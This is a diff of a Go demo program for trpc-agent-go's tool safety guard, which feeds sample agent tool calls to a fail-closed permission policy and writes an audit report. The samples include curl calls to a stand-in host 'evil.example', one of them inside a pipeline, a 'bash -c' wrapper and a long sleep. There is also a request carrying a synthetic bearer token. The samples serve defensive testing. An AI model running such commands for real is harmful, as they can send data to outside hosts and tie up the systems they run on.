@@ -1,12 +1,12 @@
 //
 // Tencent is pleased to support the open source community by making trpc-agent-go available.
 //
-// Copyright (C) 2025 Tencent. All rights reserved.
+// Copyright (C) 2025 Tencent.  All rights reserved.
 //
 // trpc-agent-go is licensed under the Apache License Version 2.0.
 //
 
-// Package main demos tool/safety.Guard as a tool.PermissionPolicy (#2002).
+// Package main demos tool/safety.Guard against the sample matrix in issue 2002.
 package main
 
 import (
@@ -16,13 +16,14 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"strings"
 
 	"trpc.group/trpc-go/trpc-agent-go/tool"
 	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
 )
 
 func main() {
-	fmt.Println("trpc-agent-go tool safety guard demo (#2002)")
+	fmt.Println("tool/safety demo for issue 2002")
 	fmt.Println("PermissionPolicy + shellsafe, fail-closed")
 
 	if err := os.MkdirAll("output", 0o750); err != nil {
@@ -39,6 +40,7 @@ func main() {
 		safety.WithAuditor(auditor),
 	)
 
+	token := "sk-" + strings.Repeat("a", 32)
 	samples := []struct {
 		title string
 		tool  string
@@ -50,16 +52,23 @@ func main() {
 		{"denied host", "workspace_exec", map[string]any{"command": "curl https://evil.example/x"}},
 		{"allowed host", "workspace_exec", map[string]any{"command": "curl https://api.github.com/events"}},
 		{"shell wrapper", "workspace_exec", map[string]any{"command": "bash -c 'id'"}},
+		{"pipeline denied host", "workspace_exec", map[string]any{"command": "echo hi | curl https://evil.example/x"}},
 		{"npm install ask", "workspace_exec", map[string]any{"command": "npm install express"}},
-		{"secret token", "workspace_exec", map[string]any{"command": "curl -H 'Authorization: Bearer sk-78c331e8061c42a4883cfee6633447dd' https://api.github.com"}},
-		{"hostexec ask", "exec_command", map[string]any{"command": "go test ./..."}},
+		{"long sleep ask", "workspace_exec", map[string]any{"command": "sleep 99999"}},
+		{"oversized stdin ask", "workspace_exec", map[string]any{
+			"command": "cat",
+			"stdin":   strings.Repeat("y", 2<<20),
+		}},
+		{"secret token", "workspace_exec", map[string]any{
+			"command": "curl -H 'Authorization: Bearer " + token + "' https://api.github.com",
+		}},
+		{"hostexec ask", "exec_command", map[string]any{"command": "echo ok"}},
 		{"code_blocks secret", "execute_code", map[string]any{
 			"code_blocks": []map[string]string{{"language": "python", "code": "api_key=supersecretvalue123"}},
 		}},
 	}
 
 	ctx := context.Background()
-	var reports []safety.Result
 	for i, s := range samples {
 		raw, _ := json.Marshal(s.args)
 		dec, err := guard.CheckToolPermission(ctx, &tool.PermissionRequest{
@@ -73,7 +82,7 @@ func main() {
 		fmt.Printf("[%d] %s\n  tool=%s action=%s reason=%s\n",
 			i+1, s.title, s.tool, dec.Action, dec.Reason)
 	}
-	reports = guard.LastResults()
+	reports := guard.LastResults()
 	if err := safety.WriteReportJSON(filepath.Join("output", "tool_safety_report.json"), reports); err != nil {
 		log.Fatal(err)
 	}
